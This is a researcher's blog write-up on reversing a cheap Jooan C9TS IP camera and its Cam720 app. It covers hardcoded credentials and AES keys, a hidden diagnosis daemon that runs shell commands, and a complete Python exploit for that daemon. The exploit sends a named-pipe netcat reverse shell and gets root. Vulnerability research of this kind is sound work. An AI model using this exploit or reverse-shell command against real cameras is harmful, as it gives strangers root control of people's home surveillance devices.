---
layout: single
title: "From Temu to Root: Breaking the Jooan C9TS"
excerpt: "How a cheap IP camera and some 'procrastination' led to a full Remote Code Execution vulnerability."
date: 2026-03-12
classes: wide
header:
  teaser: /assets/images/jooan-rce/teaser.jpg
  teaser_home_page: true
categories:
  - reverse engineering
  - android
  - hardware hacking
tags:  
  - hardware hacking
---

> An LLM was used to assist in writing this post.

As my yearly procrastination activity, I decided to finally dive into hardware hacking. I stocked up on the essentials: a soldering iron, a heatgun, a multimeter, some jumper wires, a **Bus Pirate** (which I bought for no apparent reason, as I could have just used my Flipper Zero for UART), and a **CH341** chip programmer. For my "victim," I chose a **Jooan C9TS IP camera** that I snagged from Temu for dirt cheap.

## Cracking the Shell: The Ingenic T23

I started by disassembling the camera to check for a UART port. Once the plastic housing was out of the way, I got my first good look at the heart of the device. The board is powered by an **Ingenic T23 SoC**, a common choice for budget IP cameras, paired with an **SPI flash chip** that handles the storage.

![Board Layout](/assets/images/jooan-rce/board.jpg)

## Hunting for the Console

My primary goal was to find a serial console. With the device powered on, I used a multimeter to look for the tell-tale voltage fluctuations that indicate data transmission. There were only three pairs of pads that stood out, and two of them were positioned near the CPU. After probing those two, I successfully located the **TX and RX pads** of the UART interface.

![UART](/assets/images/jooan-rce/uart.jpg)

## The Silent Treatment: UART Logs and U-Boot Locks

By soldering some wires to these pads and connecting them to the Bus Pirate, I was ready to see what this camera had to say during its boot sequence. I turned on the camera and began seeing logs in the terminal, but they stopped abruptly at a particular point.

![UART log](/assets/images/jooan-rce/uart-log.png)

I tried hitting the Enter key, but nothing happened — the shell was non-responsive. I even attempted to bridge the **Data Out (DO)** pin of the SPI flash chip to ground to interrupt the boot process, but I was greeted with a password-protected U-Boot shell. The front door was officially locked.

## Flash Extraction: Trial by Hardware

With the UART console restricted, the next best thing was to read the flash chip directly using a chip reader. This is where the "simple" project hit a wall. No matter how many times I tried with my initial setup, the chip simply would not be detected.

At first, I suspected a faulty programmer or a poor connection with the clip. Frustrated and determined not to let procrastination win, I decided to upgrade my toolkit and ordered an **XGecu T48**. By this time, I had been watching way too many [Matt Brown videos](https://www.youtube.com/@mattbrwn) and was feeling inspired by his professional setups. I got the socket adapters ready; if I couldn't get a shell through the pins, I was going to pull the firmware right out of the silicon.

### Casualty Report: Hardware is Hard

I decided to desolder the flash chip to get a clean read. In a moment of over-eagerness and perhaps too much force, I managed to break a pin off the chip.

> **Casualty: 1**  
> **Ego: Shattered**

I ordered another camera (the perks of "dirt cheap" tech) and this time I was careful enough not to break any pins.

## The Mystery of the Unidentifiable Chip

Searching online, I found references suggesting that this camera uses an **XM25QH64C** as the flash chip, which was also confirmed by the UART logs. However, the chip was still not being detected by the XGecu T48. To rule out a faulty programmer, I successfully read a BIOS chip from an old DVR. The XGecu was fine; the camera's chip was the problem.

I tried searching for the marking on the chip — **25QH64DHIQ**. It returned as an XMC chip, but it still wouldn't get detected by the programmer. Even trying various generic SPI combinations yielded no results.

![Flash chip](/assets/images/jooan-rce/flash-chip.jpg)

## The Wall: Forums, Discords, and Despair

I scoured forums and the [Thingino](https://thingino.com/) Discord channel (an amazing open-source firmware project for Ingenic SoC cameras) to see if there was a fix for this specific chip, but nothing worked. I was stuck. I even searched for a pre-existing firmware image online, but there was zero reference to it anywhere on the internet.

Then, the procrastination finally won. I decided to call it quits and pack everything away. However, before I admitted total defeat, I managed to keep the wires soldered to the UART pads — just in case I ever found the motivation for a second try.

![Cam](/assets/images/jooan-rce/cam.jpg)

## Pivoting to the App: Cam720

The Jooan camera is controlled using an app called **Cam720**. Since the hardware was giving me a hard time, I decided to pivot and look into the Android app for interesting artifacts, hardcoded credentials, or API calls that might give me a different way in.

I used **jadx** to decompile the APK and started grepping for the string `"firmware"` across all Java files. That led me directly to the package `com/jooan/biz/firmware_update/`.

![Firmware package in jadx](/assets/images/jooan-rce/firmware.png)

Inside the package, four files form the complete firmware update subsystem:

| File | Role |
|------|------|
| `FirmwareUpdateUtil.java` | Static helpers; URL builder and top-level upgrade dispatcher |
| `FirmwareModelImpl.java` | HTTP layer; builds and fires the actual network request |
| `FirmwarePresenterImpl.java` | MVP presenter that wires the model to the UI |
| `FirmwareUpdateXmlParser.java` | XML pull-parser for the legacy CDN response format |

---

## 1. Entry Point — Finding the Firmware Update Code

### URL Construction — `getFwXmlUrlByModel()`

The first interesting method is `getFwXmlUrlByModel()` in `FirmwareUpdateUtil`. Given a device model string, it constructs the XML manifest URL used to check for updates:
```java
public static String getFwXmlUrlByModel(String str) {
    // Fallback: extract characters 0–1 of the second dash-segment
    String strSubstring = str.split("-")[1].substring(0, 2);
    String str2 = CommonConstant.FW_UPDATE_HEAD_URL + strSubstring + "/" + strSubstring + ".xml";
    return str2;
}
```

For a model string like `JA-C9T`, the app requests `<BASE>/C9/C9.xml` — making the model-to-path mapping trivially predictable and enumerable. The base URL was found hardcoded in `CommonConstant.java` as `http://www.5qa.so/file/tFirmware/`, though Burp history revealed the real CDN in use is `use1upgrade1.jooaniot.com` — the app migrated infrastructure at some point while leaving the old constant in the code.

### The OTA Payload — `doFirmwareUpgrade()`

Once a newer version is confirmed, the app dispatches the upgrade via a **192-byte binary control message** over the P2P channel. The payload layout is:
```
Offset  Length  Field
──────  ──────  ─────────────────────────────────────
0       16      Firmware version string (null-padded)
16      48      MD5 checksum (hex string, null-padded)
64      128     Firmware download URL (null-padded)
```

The IOCtrl command code sent to the camera is `0x40080E`. The camera accepts this with **no signature verification** — only an MD5 checksum that an attacker fully controls. Any authenticated session can push an arbitrary firmware URL with a matching MD5, and the camera will fetch and flash it.

Once I downloaded a firmware image, the procrastination hit again — it sat on my desktop for months. When I finally came back to it, I started with the app again to look for a way to push custom firmware. That search led me to something far more interesting.

---

## 2. A Hidden Feature — Diagnosis Mode

While looking further into the app, I found something never exposed in the normal UI — a hidden vendor-only remote troubleshooting mode called **Diagnosis**. Grepping for `"diagnosis"` surfaced the full feature package at `com/jooan/qiaoanzhilian/ali/diagnosis/`. The key file was `DiagnosisDataManager.java` — a 498-line singleton owning four cloud API calls and a direct local HTTP command to the camera.

### Decrypting the Endpoints

There are no URLs in plaintext anywhere in the APK. A class called `BasicConstants` contained encrypted Base64 blobs alongside a variable `GLOBAL_INFO_AES_KEY` with the value `"0032561478523654"`. A usage search revealed `AesCbcUtils` — using **AES-128-CBC** with a hardcoded IV of `"0102030405060708"` — as the class responsible for decrypting them.

Decrypting the blobs yielded all production endpoints:

| Flavor | Environment | `api_qa_service` | `api_netty_server` |
|--------|-------------|------------------|-------------------|
| cam720 | test | `https://usw2api-test.jooaniot.com` | `https://qanetty-test.qalink.cn` |
| **cam720** | **release** | **`https://use1api.jooaniot.com`** | **`https://qanetty.qalink.cn`** |
| other | test | `https://dubbotest.jooancloud.com` | `https://qanetty-test.qalink.cn` |
| other | release | `https://qacloudapi.jooancloud.com` | `https://qanetty.qalink.cn` |

### `letDevice2Connected()` — The Local HTTP Command

This is the most interesting method in the file. Rather than going through the cloud, it talks directly to the camera over LAN HTTP:
```java
public final void letDevice2Connected(boolean enable, String deviceIp,
        String authCode, Long authTime, ...) {

    linkedHashMap.put("singleCMD",      "SetDiagMode");
    linkedHashMap.put("enable",         enable ? "1" : "0");
    linkedHashMap.put("authcode",       authCode);
    linkedHashMap.put("authserverip",   wifiIP);
    linkedHashMap.put("authserverport", String.valueOf(TcpProxyServer.INSTANCE.getNATIVE_SERVER_PORT()));
    linkedHashMap.put("userid",         "admin");
    linkedHashMap.put("userkey",        CommonUtil.md5("admin123"));

    OKHttpUtil.getInstance().RequestGetNonSync(
        "http://" + deviceIp + "/goform/SingleHandlebyCommand", ...
    );
}
```

Two things stand out immediately. The credentials — `userid=admin` and `userkey=MD5("admin123")` — are hardcoded constants, the same value on every device, baked into the APK. The protocol is plain HTTP with no TLS. The auth code, the phone's WiFi IP, and the callback port all travel in cleartext.

The other three methods in `DiagnosisDataManager` handle cloud bookkeeping: `getDiagnosisCode()` requests an authorization code from `qanetty.qalink.cn`, `queryDiagnosisStatus()` polls session state, and `modifyDiagnosticInformation()` updates the session record. A `diagnosisType` field distinguishes local sessions (`1`) from remote (`2`). None of these validate the auth code before it reaches the camera.

### The Feature is Hidden by Design

All four diagnosis activities in `AndroidManifest.xml` are declared with `android:exported="false"` and no intent filters — invisible to the Android intent system. Launching via ADB directly surfaced a Chinese-language permission notice and, after clicking through, a 6-digit authorization code screen.

![Diagnosis](/assets/images/jooan-rce/diagnosis.png)
![Diagnosis code](/assets/images/jooan-rce/diagnosis1.png)

The full intended flow:
```
  Android App                  Camera (LAN)           qanetty.qalink.cn
      │                             │                         │
      │  ① GET authorizationCode    │                         │
      │────────────────────────────────────────────────────►  │
      │  ← { authorizationCode, authorizationTime }           │
      │                             │                         │
      │  ② POST /goform/SingleHandlebyCommand  [plain HTTP]   │
      │    userid=admin  userkey=MD5("admin123")              │
      │    authcode=<code>  authserverip=<phone>:49000        │
      │────────────────────────────►│                         │
      │  ← "success"                │                         │
      │                             │                         │
      │  ③ TcpProxyServer binds :49000 (camera will call back)│
```

---

## 3. Into the Firmware — Finding `jooandiag`

By this time I decided to look at the firmware image that had been sitting on my desktop. Using `binwalk` to extract it revealed a binary called `jooandiag` in the filesystem:
```bash
$ binwalk -e A12_IronMan_05.02.31.105.img
$ ls squashfs-root/run/
default_4g.script  default.script  iwpriv  jooandiag  jooanipc  json_debug  kernelinfo  my_watch_dog  rebootim  reset2default  rf  syslogd
$ file squashfs-root/run/jooandiag
jooandiag: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV),
dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

The binary is a stripped MIPS32 ELF. While working through it in Ghidra I found this:
```c
FUN_00403940();
execl("/bin/sh", "sh", &DAT_0040540c, param_1, 0);
_exit(0x7f);
```

Something was being passed to `/bin/sh` — a telltale sign of command injection. The question was whether `param_1` could be controlled remotely.

---

## 4. Reversing `jooandiag`

### Architecture

Tracing `__uClibc_main` to `FUN_00402aa4` identified `main`. The daemon spins up two threads after reading config and stays alive until an enable flag is cleared:
```c
undefined4 FUN_00402aa4(void) {
    signal(SIGPIPE, FUN_00402a24);         // ignore broken pipe
    unlink("/tmp/.diagser.sock");          // clean up stale socket
    FUN_00401150("/tmp/.diagser.sock");    // create UNIX domain socket + listen
    FUN_004027b8();                        // read config from /opt/conf/config.json

    pthread_create(&t1, NULL, FUN_0040187c, DAT_00415ae4); // Thread 1: local IPC
    pthread_create(&t2, NULL, FUN_00402030, DAT_00415ae4); // Thread 2: cloud TCP

    sleep(60);
    while (DAT_00415ae0 != 0) sleep(1);
    close(DAT_00415ae4);
}
```

### Thread 1 — Local IPC Server

This thread listens on `/tmp/.diagser.sock` for a configuration struct from `jooanipc`:
```c
struct diag_config {
    int   cmd;            // must equal 1 to configure
    int   en;             // enable flag
    int   timestamp;      // auth expiry
    char  authcode[32];   // becomes the AES-128 key
    char  server_ip[64];  // attacker IP
    char  server_url[128];
    int   port;           // attacker port
};
```

When `cmd == 1`, all fields are written into globals that Thread 2 watches. The auth code lands in `DAT_00415bbc` — which becomes the AES-128 key for the entire session.

### Thread 2 — Remote Command Execution

Once armed, Thread 2 opens a TCP connection to `server_ip:port` and immediately sends a plaintext JSON handshake:
```c
snprintf(buf, 0xff, "{\"AuthorizationCode\":\"%s\",", &DAT_00415bbc);
snprintf(buf + n, 0xff - n, "\"deviceId\":\"%s\"}", &DAT_00415b38);
send(fd, &length_prefix, total, 0);
```

This goes over plain TCP with no TLS. The auth code — which is also the AES key — is transmitted in cleartext in this first message.

After the handshake, the binary enters a receive loop. Each inbound message is Base64-decoded, then AES-128-ECB decrypted using the auth code as the key. Before execution, one check runs:
```c
pcVar5 = strstr((char *)(local_e4 + 1), "DiagnosisStatus");
if (pcVar5 == (char *)0x0) {
    // string absent → execute as shell command
    FUN_00403dd0(local_e4, ...);   // execl("/bin/sh", "-c", cmd)
} else {
    // string present → platform keepalive, discard
    FUN_00402cec("[Debug]=>...platform notify return\n", ...);
}
```

Payloads containing `"DiagnosisStatus"` are cloud keepalives — logged and discarded. Everything else goes directly to `/bin/sh`. The response is AES-128-ECB encrypted and Base64-encoded before being sent back.

The crypto uses **ECB mode with no IV** — identical plaintext blocks produce identical ciphertext — and the key was already sent in cleartext during the handshake, so it provides no real confidentiality against a network observer.

### How `jooanipc` and `jooandiag` Connect
```
  Cam720 App (phone)                jooanipc (camera)         jooandiag (camera)
        │                                  │                          │
        │  GET /goform/SingleHandlebyCommand                          │
        │  userid=admin  userkey=MD5("admin123")                      │
        │  authcode=<code>  authserverip=<phone>:49000                │
        │─────────────────────────────────►│                          │
        │  ← "success"                     │                          │
        │                                  │  write diag_config{}     │
        │                                  │  to /tmp/.diagser.sock   │
        │                                  │─────────────────────────►│
        │                                  │                Thread 2 wakes, TCP connect
        │◄─────────────────────────────────────────────────────────────
        │  {"AuthorizationCode":"<code>","deviceId":"..."}  [PLAINTEXT]
        │                                  │                          │
        │  AES-ECB-encrypt(Base64(command))│                          │
        │─────────────────────────────────────────────────────────────►
        │                                  │         strstr → absent → /bin/sh -c cmd
        │◄─────────────────────────────────────────────────────────────
        │  AES-ECB-encrypt(Base64(stdout)) │                          │
```

The trust boundary is the UNIX socket. `jooanipc` is the gatekeeper — once it writes the config, `jooandiag` accepts everything unconditionally.

---

## 5. Emulation

Before testing live, I wanted to confirm the behaviour in QEMU. Three obstacles stood between me and a running binary.

**Library mismatch.** The binary requires MIPS little-endian uClibc hard-float — the `ramips_24kec` ABI. Standard Ubuntu MIPS packages fault immediately. The right libraries came from the **OpenWrt Chaos Calmer (15.05) archives** (`uClibc 0.9.33.2`). mbedTLS came from **Entware mipsel-3.4** and **OpenWrt 22.03**, with manual symlink fixes (`libmbedtls.so.13` → `libmbedtls.so.14`).

**`json_debug` crashes.** The binary shells out to `/usr/bin/json_debug` repeatedly to read config fields. The original segfaulted in QEMU trying to access hardware registers that don't exist in emulation. I replaced it with a static mock cross-compiled with the Bootlin MIPS toolchain:
```c
// mipsel-linux-gcc -static mock_json_debug.c -o json_debug
int main(int argc, char *argv[]) {
    char *key = "";
    for (int i = 0; i < argc; i++) {
        if (strcmp(argv[i], "-k") == 0 && i + 1 < argc) { key = argv[i+1]; break; }
    }
    if      (strcmp(key, "/DiagMode/Enable")    == 0) printf("node: %s 1\n", key);
    else if (strcmp(key, "/UIDInfo/P2pID")       == 0) printf("node: %s TEST_DEVICE_ID\n", key);
    else if (strcmp(key, "/DiagMode/AuthCode")   == 0) printf("node: %s 123456\n", key);
    else if (strcmp(key, "/DiagMode/ServerIp")   == 0) printf("node: %s 127.0.0.1\n", key);
    else if (strcmp(key, "/DiagMode/ServerPort") == 0) printf("node: %s 49000\n", key);
    else                                                printf("node: %s unknown\n", key);
    return 0;
}
```

**Wrong CPU flags.** `-cpu mips32` and `-cpu 24Kc` both produced `Illegal instruction` faults. The fix was `-cpu 24KEc`, which includes the DSP Application-Specific Extension the Ingenic T23 uses.

With all three resolved, the binary ran and connected back:
```bash
root@jamoski-dev# chroot qemu_rootfs /qemu-mipsel-static -cpu 24KEc /run/jooandiag
[diag_mode.c][_DIAG_MODE_ReadDiagInfo]en:(49) id:(TEST_DEVICE_ID) code:(123456) ... ip:(127.0.0.1) port:(49000)
[diag_mode.c][_DIAG_MODE_ConnetTcpServer]connect ip(127.0.0.1) port(49000) fd:(4) success
```
```bash
$ nc -lvnp 49000
Connection received on 127.0.0.1 43542
:{"AuthorizationCode":"123456","deviceId":"TEST_DEVICE_ID"}
```

The auth code — and therefore the AES key — arrives in cleartext in the first message.

---

## 6. Building the Exploit Server

With the wire format confirmed, I wrote a server to speak it. My first attempt injected `"DiagnosisStatus"` into the payload thinking it was needed to pass a guard check — it turned out to be exactly backwards. That string routes the payload to the discard branch. Plain commands with no prefix work correctly.
```python
import socket, struct, time, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AUTH_CODE = "123456"
COMMAND   = "touch /tmp/pwned"

def device_aes_key(auth_code: str) -> bytes:
    # Raw ASCII auth code NUL-padded to 16 bytes — confirmed in FUN_004034f0
    return auth_code.encode("ascii").ljust(16, b"\x00")[:16]

def encrypt_for_device(plaintext: str, auth_code: str) -> bytes:
    # Mirrors FUN_004034f0 encrypt path:
    #   PKCS#7 pad → AES-128-ECB per block → Base64 encode
    key = device_aes_key(auth_code)
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode(), 16)))

def build_rce_payload(auth_code: str, command: str) -> bytes:
    # Wire format: [ 4-byte big-endian length ][ Base64(AES-ECB(command)) ]
    # Command must NOT contain "DiagnosisStatus" — that routes to discard branch
    b64 = encrypt_for_device(command, auth_code)
    return struct.pack(">I", len(b64)) + b64
```

The binary's own debug log confirmed execution:
```
[_DIAG_MODE_TCPServerProcess]cmd(33):(touch /tmp/pwned;) return:(134)
```
```bash
$ ls -la qemu_rootfs/tmp/pwned
-rw-r--r-- 1 root root 0 Mar 12 10:26 qemu_rootfs/tmp/pwned
```

---

## 7. Taking It to the Real Camera

The final question was whether `jooanipc` validates the auth code against the cloud before writing it to the socket. Looking back at `letDevice2Connected()` confirmed it does not — the code is forwarded directly. Any value we choose becomes the AES key.
```python
#!/usr/bin/env python3
"""
Jooan Camera — Offline Local Network RCE
pip install requests pycryptodome
"""
import socket, struct, threading, time, hashlib, base64, json, requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

CAMERA_IP       = "192.168.1.137"
CAMERA_PORT     = 80
CAMERA_PASSWORD = "admin123"        # hardcoded in APK
LHOST           = "192.168.1.65"
LPORT           = 49000
AUTH_CODE       = "999999"          # arbitrary — camera never validates against cloud
# Named pipe reverse shell — BusyBox nc lacks -e/-c flags
COMMAND = "rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.65 4444 > /tmp/f"

def md5(s): return hashlib.md5(s.encode()).hexdigest()

def device_aes_key(auth_code):
    return auth_code.encode("ascii").ljust(16, b"\x00")[:16]

def encrypt_for_device(plaintext, auth_code):
    key = device_aes_key(auth_code)
    cipher = AES.new(key, AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(pad(plaintext.encode("utf-8"), 16)))

def build_rce_payload(auth_code, command):
    print(f"\n[*] Building payload...")
    key = device_aes_key(auth_code)
    print(f"    [+] Auth code:         {auth_code}")
    print(f"    [+] AES-128 key (hex): {key.hex()}")
    print(f"    [+] Command:           {command!r}")
    b64 = encrypt_for_device(command, auth_code)
    frame = struct.pack(">I", len(b64)) + b64
    print(f"    [+] Frame size:        {len(frame)} bytes")
    return frame

class MaliciousTcpServer(threading.Thread):
    def __init__(self, lhost, lport, payload):
        super().__init__(daemon=True)
        self.lhost, self.lport, self.payload = lhost, lport, payload
        self.done = threading.Event()
        self.success = False

    def run(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((self.lhost, self.lport))
        srv.listen(1)
        srv.settimeout(60)
        print(f"\n[*] Listening on {self.lhost}:{self.lport}...")

        try:
            conn, addr = srv.accept()
        except socket.timeout:
            print("    [!] Timed out."); self.done.set(); return

        print(f"    [+] Camera connected from {addr[0]}:{addr[1]}")
        conn.settimeout(10)

        try:
            raw_len = conn.recv(4)
            if raw_len:
                # jooandiag sends auth code in plaintext here (FUN_00401c58)
                # a passive LAN observer captures the AES key at this point
                msg_len = struct.unpack(">I", raw_len)[0]
                handshake = conn.recv(msg_len)
                print(f"    [<] Handshake: {handshake.decode('utf-8', errors='replace')}")
        except Exception as e:
            print(f"    [!] Handshake error: {e}")

        # jooandiag will: Base64-decode → AES-decrypt → strstr check →
        # "DiagnosisStatus" absent → execl("/bin/sh", "-c", cmd, 0)
        print(f"    [*] Sending encrypted command...")
        try:
            conn.sendall(self.payload)
            print(f"    [>] {len(self.payload)} bytes sent.")
            time.sleep(2)
            self.success = True
        except Exception as e:
            print(f"    [!] Send error: {e}")

        conn.close(); srv.close()
        print(f"    [*] Connection closed.")
        self.done.set()

def arm_camera(auth_code, auth_time):
    # Hardcoded credentials from letDevice2Connected() in DiagnosisDataManager.java
    print(f"\n[*] Sending SetDiagMode to {CAMERA_IP}...")
    params = {
        "singleCMD": "SetDiagMode", "enable": "1",
        "authcode": auth_code, "authtime": str(auth_time),
        "authserverip": LHOST, "authserverport": str(LPORT),
        "userid": "admin", "userkey": md5(CAMERA_PASSWORD),
    }
    url = f"http://{CAMERA_IP}:{CAMERA_PORT}/goform/SingleHandlebyCommand"
    print(f"    [>] GET {url}")
    try:
        resp = requests.get(url, params=params, timeout=10)
        print(f"    [<] HTTP {resp.status_code}: {resp.text.strip()}")
    except requests.exceptions.ReadTimeout:
        # Camera spawned jooandiag which called back before jooanipc could
        # respond — the shell command consumed the process. Expected behaviour.
        print("    [+] HTTP timed out — camera is executing the payload.")
    except requests.exceptions.ConnectionError:
        print(f"    [!] Could not reach {CAMERA_IP}:{CAMERA_PORT}")

def main():
    print("=" * 57)
    print(" Jooan Camera — Offline LAN RCE")
    print("=" * 57)
    print(f" Target:         {CAMERA_IP}:{CAMERA_PORT}")
    print(f" Attacker:       {LHOST}:{LPORT}")
    print(f" Shell listener: nc -lvnp 4444")
    print("=" * 57)

    payload    = build_rce_payload(AUTH_CODE, COMMAND)
    tcp_server = MaliciousTcpServer(LHOST, LPORT, payload)
    tcp_server.start()
    time.sleep(0.5)
    arm_camera(AUTH_CODE, int(time.time()))

    print(f"\n[*] Waiting for execution (60s timeout)...")
    tcp_server.done.wait(timeout=65)
    if tcp_server.success:
        print(f"\n[+] Payload delivered — check your nc listener on port 4444.")
    else:
        print(f"\n[-] Exploit did not complete.")

if __name__ == "__main__":
    main()
```

Running the exploit with a `nc -lvnp 4444` listener open:
```text
==========================================================
 Jooan Camera — Offline LAN RCE
==========================================================
 Target:         192.168.1.137:80
 Attacker:       192.168.1.65:49000
 Shell listener: nc -lvnp 4444
==========================================================

[*] Building payload...
    [+] Auth code:         999999
    [+] AES-128 key (hex): 39393939393900000000000000000000
    [+] Command:           'rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.65 4444 > /tmp/f'
    [+] Frame size:        132 bytes

[*] Listening on 192.168.1.65:49000...
    [+] Camera connected from 192.168.1.137:52123
    [<] Handshake: {"AuthorizationCode":"999999","deviceId":"TAL67DN7F542LCXU111A"}
    [*] Sending encrypted command...
    [>] 132 bytes sent.
    [*] Connection closed.

[*] Sending SetDiagMode to 192.168.1.137...
    [+] HTTP timed out — camera is executing the payload.

[+] Payload delivered — check your nc listener on port 4444.
```

On the listener:
```bash
jamoski@jamoski-dev:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 192.168.1.137 60302
/bin/sh: can't access tty; job control turned off
/ # id
uid=0(root) gid=0(root)
/ #
```

Root shell. No Jooan account, no cloud interaction, no credentials beyond the factory default baked into every copy of the app.

---

## 8. Going Deeper — Unlocking the UART Console

With a root shell in hand, I wanted to re-enable the UART console output that had been silenced since the hardware phase. Confirming the problem from the shell:
```bash
# strings /dev/mtd1 | grep bootargs
bootargs=console=null mem=43548K@0x0 rmem=21988K@0x2a87000 ...
```

`fw_printenv` and `fw_setenv` don't exist on this firmware, so the only option was patching the raw flash. The bootenv partition (`mtd1`, 32768 bytes) uses a simple format: a 4-byte little-endian CRC32 followed by null-terminated `key=value` strings, padded with `0xFF`. The patch script finds `console=null`, replaces it with `console=ttyS1,115200n8`, re-pads to 32768 bytes, and recalculates the CRC:
```python
#!/usr/bin/env python3
import zlib, struct

with open("/tmp/bootenv_orig.bin", "rb") as f:
    raw = bytearray(f.read())

assert len(raw) == 32768

stored_crc = struct.unpack_from("<I", raw, 0)[0]
calc_crc   = zlib.crc32(raw[4:]) & 0xFFFFFFFF
assert stored_crc == calc_crc, "CRC mismatch — wrong partition?"
print(f"CRC verified: {stored_crc:#010x}")

old, new = b"console=null", b"console=ttyS1,115200n8"
idx = raw.find(old, 4)
assert idx != -1
raw[idx:idx+len(old)] = new
raw = (raw + b"\xff" * 32768)[:32768]

new_crc = zlib.crc32(raw[4:]) & 0xFFFFFFFF
struct.pack_into("<I", raw, 0, new_crc)
print(f"New CRC:      {new_crc:#010x}")

with open("/tmp/bootenv_patched.bin", "wb") as f:
    f.write(raw)
```

Transferred to the camera over `nc`, MD5-verified on both sides, then flashed:
```bash
# Camera
flash_eraseall /dev/mtd1 && dd if=/tmp/bootenv_patched.bin of=/dev/mtd1
Erasing 32 Kibyte @ 8000 - 100% complete.
64+0 records in / 64+0 records out
32768 bytes copied, 0.060175 seconds, 531.8KB/s
```

Verified in flash:
```bash
strings /dev/mtd1 | grep console
# bootargs=console=ttyS1,115200n8 mem=43548K@0x0 ...
```

After a reboot, the UART wires that had been sitting soldered to the board since day one finally had something to say — full kernel boot log over serial.

---

## 9. The Brick — Overconfidence Meets Flash

The UART logs were finally flowing. Seeing the full kernel boot sequence — including `console=ttyS1,115200n8` confirmed in the kernel command line — after months of the serial port giving nothing was the kind of validation that makes you feel invincible. That feeling is dangerous.
```
Kernel command line: console=ttyS1,115200n8 mem=43548K@0x0 rmem=21988K@0x2a87000
init=/linuxrc rootfstype=squashfs root=/dev/mtdblock3 rw
ja_version=01.23N.20231228.19 HWUbootGpioSet=60(0) CpuType=T23N
```

Confident the hardware was now fully accessible, I decided to attempt flashing Thingino — and made the mistake of flashing `mtd0` (U-Boot) over a `nc` shell with no error recovery. The connection dropped mid-write. Stock Jooan U-Boot gone, nothing left to boot from. The camera is now a paperweight.

It was still a good run:

- Found and decoded a hidden vendor diagnostic feature in the APK
- Recovered production endpoints from AES-encrypted constants
- Reversed a stripped MIPS binary to confirm an unauthenticated RCE primitive
- Emulated the binary in QEMU despite dependency hell
- Got a root shell on a live camera with no cloud account and no prior credentials
- Patched flash directly to re-enable UART output
- Finally got kernel logs out of a device that had been silent since day one
